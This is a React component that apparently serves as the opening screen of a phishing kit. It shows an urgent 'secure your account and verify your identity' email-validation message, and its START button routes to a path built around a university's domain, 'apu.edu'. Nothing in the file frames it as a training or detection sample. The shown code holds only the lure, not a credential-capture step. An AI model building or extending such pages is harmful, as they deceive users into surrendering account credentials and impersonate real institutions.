import "./App.css";
import { useNavigate } from "react-router-dom";
function Address() {
  const navigate = useNavigate();
  return (
    <>
      <div className="main">
        <div className="form-container">
          <h1 className="form-head">
            Secure your account and verify your identity
          </h1>
          <div className="text">
            To ensure your account remains active, please confirm your email
            usage by completing the validation process below. This helps us
            maintain the security and functionality of our email systems.
          </div>
          <button
            type="submit"
            onClick={() => navigate("/apu.edu/service/update")}
          >
            START
          </button>
        </div>
      </div>
    </>
  );
}

export default Address;
